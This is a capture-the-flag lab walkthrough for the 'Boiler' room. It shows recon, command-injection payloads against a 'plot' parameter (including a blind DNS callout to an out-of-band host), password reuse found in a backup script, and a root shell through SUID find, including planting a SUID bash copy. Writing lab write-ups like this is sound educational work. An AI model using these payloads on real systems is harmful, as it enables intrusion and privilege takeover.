# Boiler CTF — Walkthrough & Learning Notes (human-style) 🚀

> **Goal**: be extremely educational while keeping the human touch — emojis, side-notes, and gentle explanations.

---

## 🗺️ Scope & Target

- **Host**: `10.201.33.188`
- **Observed services**
  - **HTTP (Joomla)** — `/joomla/` and `/joomla/administrator/`
  - **SSH** — custom port `55007`
  - **Webmin/MiniServ** — `10000/tcp` → `MiniServ/1.930` (self-signed TLS)

---

## 🔎 Recon

```bash
nmap -sV -p 80,10000,55007 10.201.33.188
```
- `10000/tcp open  http  MiniServ 1.930 (Webmin httpd)`
- Joomla front-end & admin backend reachable under `/joomla/`

---

## 🤖 robots.txt → hidden path + token

Paths:
```
/yellow /not /a+rabbit /hole /or /is /it
/tmp /.ssh
```
Numbers:
```
079 084 108 105 ... 081
```
Decode:
```bash
echo '079 084 ... 081' | awk '{for(i=1;i<=NF;i++) printf "%c",$i}' | base64 -d
# -> 99b0660cd95adea327c54182baa51584
```
Follow the “rabbit hole” (URL-encode `+` → `%2B`):
```
/yellow/not/a%2Brabbit/hole/or/is/it/
```

---

## 🧾 DeepPaste → SSIDs/PSKs

Examples:
- `HIROSAKI_Free_W1-F1 : H_Free934!`
- `DKIF-G : Fsdf324T96`

> **BSSID ≠ password**. BSSID is a MAC like `aa:bb:cc:dd:ee:ff`. Use wardriving DBs or `*.netxml` logs to get BSSID.

---

## 🧪 Command Injection (OSCI, CWE-78; OWASP A03:2021) ⭐

Endpoint:
```
/joomla/_test/index.php?plot=LINUX
```
Why `plot=ls` fails but `plot=|ls -la` works:
```php
system("gnuplot -e set term $plot"); // shell metacharacters break out
```
First-wave canaries (URL-encode if blocked):
```
;id |id &&id ||id %0aid `id` $(id)
```
Blind:
```
;sleep 5 ;nslookup TOKEN.oast.site
```

---

## 🔐 Creds pivot — backup.sh gift 🎁

Password in comment:
```
# superduperp@$$no1knows
```
Use for `stoner`:
```bash
su - stoner
# or
ssh -p 55007 stoner@10.201.33.188
```

---

## 🧗 Priv-Esc with SUID find → Root 🧨

SUID:
```
-r-sr-xr-x 1 root root ... /usr/bin/find
```
Root shell:
```bash
/usr/bin/find . -maxdepth 0 -exec /bin/bash -p \; -quit
```
Alt (if `bash -p` blocked):
```bash
/usr/bin/find . -maxdepth 0 -exec sh -c 'cp /bin/bash /tmp/rbash && chmod u+s /tmp/rbash' \; -quit
/tmp/rbash -p
```

---

## 🔐 Webmin TLS (Firefox lab bypass)

- Use IP: `https://10.201.33.188:10000/`
- Add Exception (Certificates → Servers → Add Exception)
- `about:config` → `browser.xul.error_pages.expert_bad_cert=true`
- Chrome/Chromium: type `thisisunsafe`

---

## 🧠 Reusable lessons (checklist)

- Probe OSCI with `;|&&||%0a` canaries; switch to time/DNS/file for blind.
- Robots.txt is a *map*, not a lock.
- SUID → check GTFOBins (find, tar, vim/less, etc.).
- SSID/PSK ≠ BSSID.

> You did great. Keep the YAML cheat-sheet handy for future rooms. ✨
